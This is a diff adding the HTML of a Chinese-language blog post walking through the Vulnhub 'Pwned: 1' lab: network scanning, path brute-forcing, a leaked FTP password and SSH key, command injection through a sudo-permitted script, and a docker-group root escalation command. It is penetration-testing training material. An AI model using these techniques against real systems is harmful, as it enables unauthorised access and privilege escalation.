@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub-Pwned: 1 - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/pwned-1,507/ 目标 获取 3 个 flag。 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.14 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 工具 名称 版本 arp-scan 1.9.7 Nmap 7.80 rustbuster 1.0.4 信息收集 获取 IP 地址 使用" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/2020-09-21-vulnhub-pwned-1/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub-Pwned: 1" />
+<meta property="og:description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/pwned-1,507/ 目标 获取 3 个 flag。 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.14 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 工具 名称 版本 arp-scan 1.9.7 Nmap 7.80 rustbuster 1.0.4 信息收集 获取 IP 地址 使用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/2020-09-21-vulnhub-pwned-1/" />
+<meta property="article:published_time" content="2020-09-21T13:40:18+00:00" />
+<meta property="article:modified_time" content="2020-09-21T13:40:18+00:00" />
+<meta itemprop="name" content="Vulnhub-Pwned: 1">
+<meta itemprop="description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/pwned-1,507/ 目标 获取 3 个 flag。 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.14 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 工具 名称 版本 arp-scan 1.9.7 Nmap 7.80 rustbuster 1.0.4 信息收集 获取 IP 地址 使用">
+<meta itemprop="datePublished" content="2020-09-21T13:40:18+00:00" />
+<meta itemprop="dateModified" content="2020-09-21T13:40:18+00:00" />
+<meta itemprop="wordCount" content="1563">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub-Pwned: 1"/>
+<meta name="twitter:description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/pwned-1,507/ 目标 获取 3 个 flag。 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.14 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 工具 名称 版本 arp-scan 1.9.7 Nmap 7.80 rustbuster 1.0.4 信息收集 获取 IP 地址 使用"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Even</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Even</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub-Pwned: 1</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-09-21 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#基本介绍">基本介绍</a>
+          <ul>
+            <li><a href="#靶机地址">靶机地址</a></li>
+            <li><a href="#目标">目标</a></li>
+            <li><a href="#环境">环境</a></li>
+            <li><a href="#工具">工具</a></li>
+          </ul>
+        </li>
+        <li><a href="#信息收集">信息收集</a>
+          <ul>
+            <li><a href="#获取-ip-地址">获取 IP 地址</a></li>
+            <li><a href="#端口扫描">端口扫描</a></li>
+            <li><a href="#服务枚举">服务枚举</a></li>
+            <li><a href="#ftp-anonymous-探测">ftp anonymous 探测</a></li>
+            <li><a href="#web-枚举">Web 枚举</a></li>
+            <li><a href="#web-路径爆破">Web 路径爆破</a></li>
+            <li><a href="#ftp">ftp</a></li>
+            <li><a href="#ssh-登陆">SSH 登陆</a></li>
+          </ul>
+        </li>
+        <li><a href="#权限提升-part-i">权限提升 Part I</a></li>
+        <li><a href="#权限提升-part-ii">权限提升 Part II</a></li>
+        <li><a href="#总结">总结</a></li>
+        <li><a href="#参考链接">参考链接</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="基本介绍">基本介绍</h2>
+<h3 id="靶机地址">靶机地址</h3>
+<p><a href="https://www.vulnhub.com/entry/pwned-1,507/">https://www.vulnhub.com/entry/pwned-1,507/</a></p>
+<h3 id="目标">目标</h3>
+<p>获取 3 个 <strong>flag</strong>。</p>
+<h3 id="环境">环境</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">主机</td>
+<td style="text-align:left">Manjaro 20.1</td>
+</tr>
+<tr>
+<td style="text-align:left">虚拟化软件</td>
+<td style="text-align:left">Virtualbox 6.1.14</td>
+</tr>
+<tr>
+<td style="text-align:left">靶机网络</td>
+<td style="text-align:left">Host-only (vboxnet0)</td>
+</tr>
+<tr>
+<td style="text-align:left">kali in docker</td>
+<td style="text-align:left">2020.3</td>
+</tr>
+</tbody>
+</table>
+<h3 id="工具">工具</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">arp-scan</td>
+<td style="text-align:left">1.9.7</td>
+</tr>
+<tr>
+<td style="text-align:left">Nmap</td>
+<td style="text-align:left">7.80</td>
+</tr>
+<tr>
+<td style="text-align:left">rustbuster</td>
+<td style="text-align:left">1.0.4</td>
+</tr>
+</tbody>
+</table>
+<h2 id="信息收集">信息收集</h2>
+<h3 id="获取-ip-地址">获取 IP 地址</h3>
+<p>使用 <strong>arp-scan</strong> 对 <strong>vboxnet0</strong> 接口进行二层扫描，得到靶机的地址为 <strong>192.168.56.124</strong>。</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">arp-scan -I vboxnet0 --localnet
+</code></pre></td></tr></table>
+</div>
+</div><p>Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 192.168.56.1
+Starting arp-scan 1.9.7 with 256 hosts (<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)
+192.168.56.100	08:00:27:fd:e7:14	PCS Systemtechnik GmbH
+192.168.56.124	08:00:27:4d:01:c6	PCS Systemtechnik GmbH</p>
+<p>2 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 2.027 seconds (126.30 hosts/sec). 2 responded
+{% endblockquote %}</p>
+<h3 id="端口扫描">端口扫描</h3>
+<p>使用 Nmap 的半连接方式对靶机进行全 TCP 端口扫描，该靶机开放了 3 个端口：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sS -p- 192.168.56.124
+</code></pre></td></tr></table>
+</div>
+</div><p>Nmap scan report for 192.168.56.124
+Host is up (0.00013s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:4D:01:C6 (Oracle VirtualBox virtual NIC)</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
+{% endblockquote %}</p>
+<h3 id="服务枚举">服务枚举</h3>
+<p>使用 Nmap 进行服务枚举，只发现了 ftp，ssh 和 apache httpd 三种服务：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -sC -p80,139,445,8000 192.168.56.123
+</code></pre></td></tr></table>
+</div>
+</div><p>Nmap scan report for 192.168.56.124
+Host is up (0.00050s latency).</p>
+<p>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 fe💿90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
+|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f🇩🇪91:5d (ECDSA)
+|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Pwned&hellip;.!!
+MAC Address: 08:00:27:4D:01:C6 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds
+{% endblockquote %}</p>
+<p>服务版本都很新，vsftp 和 openssh 不存在可利用的漏洞，apache 2.4.38貌似存在一个 LPE 的漏洞，暂时派不上用场。</p>
+<h3 id="ftp-anonymous-探测">ftp anonymous 探测</h3>
+<p>ftp 可能会存在允许匿名登陆的情况，而且调查 ftp 是比较省时间的（相比 Web 而言），但是，该靶机不允许 ftp 匿名登陆。</p>
+<p><img src="/images/2020-09-20/ftp_detect.webp" alt="ftp"></p>
+<p>尝试暴力破解，也没有破解出什么。</p>
+<h3 id="web-枚举">Web 枚举</h3>
+<p>首先使用浏览器查看：</p>
+<p><img src="/images/2020-09-20/web.webp" alt="web"></p>
+<p>倒是很直接了当，接着查看源码发现一行注释：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- I forgot to add this on last note
+</span><span class="c">     You are pretty smart as i thought 
+</span><span class="c">     so here i left it for you 
+</span><span class="c">     She sings very well. l loved it  --&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>并没有什么用，直接爆破路径。</p>
+<h3 id="web-路径爆破">Web 路径爆破</h3>
+<p>使用 rustbuster 进行爆破：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">rustbuster -u http://192.168.56.124 -w /usr/share/dirbuster/directory-list-2.3-medium.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>http://192.168.56.124/# 200 OK
+http://192.168.56.124/server-status 403 Forbidden
+http://192.168.56.124/hidden_text 301 Moved Permanently
+http://192.168.56.124/nothing 301 Moved Permanently
+{% endblockquote %}</p>
+<p>访问 <strong>/hidden_text</strong> 可以得到一个文件 <strong>secret.dic</strong>。下载下来查看似乎是包含路径的字典：</p>
+<p><img src="/images/2020-09-20/secret_dic.webp" alt="secret_dic"></p>
+<p>再次进行路径爆破，可以发现一个新的路径：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">rustbuster -u http://192.168.56.124 -w ./secret.dic
+</code></pre></td></tr></table>
+</div>
+</div><p>http://192.168.56.124//pwned.vuln 301 Moved Permanently
+{% endblockquote %}</p>
+<p>访问该 URL，可见简易的登陆框，查看源码可见一段注释</p>
+<p><img src="/images/2020-09-20/pwned_vuln.webp" alt="pwned_vuln"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;?php
+</span><span class="cp">//	if (isset($_POST[&#39;submit&#39;])) {
+</span><span class="cp">//		$un=$_POST[&#39;username&#39;];
+</span><span class="cp">//		$pw=$_POST[&#39;password&#39;];
+</span><span class="cp">//
+</span><span class="cp">//	if ($un==&#39;ftpuser&#39; &amp;&amp; $pw==&#39;B0ss_B!TcH&#39;) {
+</span><span class="cp">//		echo &#34;welcome&#34;
+</span><span class="cp">//		exit();
+</span><span class="cp">// }
+</span><span class="cp">// else 
+</span><span class="cp">//	echo &#34;Invalid creds&#34;
+</span><span class="cp">// }
+</span><span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>得到了疑似的 ftp 账户。</p>
+<h3 id="ftp">ftp</h3>
+<p>经过验证确实是 ftp 的账号和密码，可以发现有两个文件：</p>
+<p><img src="/images/2020-09-20/ftp_login.webp" alt="ftp_login"></p>
+<p>使用 mget 将文件下载到本地，查看 note.txt，发现提到了 <strong>ariana</strong>，还有一个 id_rsa 明显是 ssh 的私钥。</p>
+<h3 id="ssh-登陆">SSH 登陆</h3>
+<p>之前有遇到过使用私钥登陆的情况，要先将私钥的权限更改为 600，猜测用户名为 <strong>ariana</strong>，使用 ssh 远程登陆</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">chmod <span class="m">600</span> id_rsa <span class="o">&amp;&amp;</span> ssh ariana@192.168.56.124 -i id_rsa
+</code></pre></td></tr></table>
+</div>
+</div><p>成功登陆，获取到第一个 flag：</p>
+<p><img src="/images/2020-09-20/ariana_login.webp" alt="ariana_login"></p>
+<h2 id="权限提升-part-i">权限提升 Part I</h2>
+<p>搜索 SUID 权限程序并没有什么异常的项目，接着查看 sudo：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -l
+</code></pre></td></tr></table>
+</div>
+</div><p>Matching Defaults entries for ariana on pwned:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<p>User ariana may run the following commands on pwned:
+(selena) NOPASSWD: /home/messenger.sh
+{% endblockquote %}</p>
+<p>查看 /home/messenger.sh 的内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+clear
+<span class="nb">echo</span> <span class="s2">&#34;Welcome to linux.messenger &#34;</span>
+		<span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+<span class="nv">users</span><span class="o">=</span><span class="k">$(</span>cat /etc/passwd <span class="p">|</span> grep home <span class="p">|</span>  cut -d/ -f 3<span class="k">)</span>
+		<span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+<span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$users</span><span class="s2">&#34;</span>
+		<span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+<span class="nb">read</span> -p <span class="s2">&#34;Enter username to send message : &#34;</span> name 
+		<span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+<span class="nb">read</span> -p <span class="s2">&#34;Enter message for </span><span class="nv">$name</span><span class="s2"> :&#34;</span> msg
+		<span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+<span class="nb">echo</span> <span class="s2">&#34;Sending message to </span><span class="nv">$name</span><span class="s2"> &#34;</span>
+
+<span class="nv">$msg</span> 2&gt; /dev/null
+
+		<span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+<span class="nb">echo</span> <span class="s2">&#34;Message sent to </span><span class="nv">$name</span><span class="s2"> :) &#34;</span>
+		<span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可见 <strong>$msg</strong> 直接执行了读入的 <strong>msg</strong>，从而可以利用该脚本进行水平越权：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u selena /home/messager.sh
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-09-20/messager.webp" alt="messager"></p>
+<h2 id="权限提升-part-ii">权限提升 Part II</h2>
+<p>刚才查看 <strong>selena</strong> 发现所属组竟然有 docker，果不其然该靶机安装了 docker：</p>
+<p><img src="/images/2020-09-20/docker.webp" alt="docker"></p>
+<p>由于靶机并没有连接到互联网，查看已经存在的镜像：</p>
+<p><img src="/images/2020-09-20/docker_images.webp" alt="docker_images"></p>
+<p>直接利用 docker 提权为 root：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">docker run -v /:/mnt -it --rm alpine chroot /mnt sh
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-09-20/root.webp" alt="get_root"></p>
+<p>成功获取到 <strong>root</strong> 权限，完成垂直越权。</p>
+<h2 id="总结">总结</h2>
+<p>事实证明，扫目录也有学问，字典很重要。刚开始我使用 rockyou 和 wfuzz 自带的字典扫了半天什么也没扫出来，差点怀疑人生。借鉴了巨佬的 <strong>walkthorugh</strong>，没想到换用 <strong>dirbuster</strong> 的字典就能扫到路径。</p>
+<p>再者就是之前对于 <strong>sudo</strong> 的理解不足，成功卡死；这次算是重新 &ldquo;认识&rdquo; 了。</p>
+<h2 id="参考链接">参考链接</h2>
+<ol>
+<li>
+<p><a href="https://toroid.org/sudoers-syntax">sudo 详解</a></p>
+</li>
+<li>
+<p><a href="https://gtfobins.github.io/gtfobins/docker/#shell">docker</a></p>
+</li>
+<li>
+<p><a href="https://www.hackingarticles.in/pwned-1-vulnhub-walkthorugh/">Pwned 1 walkthorugh</a></p>
+</li>
+</ol>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2020-09-21
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/2020-10-11-hackthebox-tabby/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Hackthebox-Tabby</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/2020-09-06-vulnhub-photographer/">
+            <span class="next-text nav-default">Vulnhub-Photographer</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
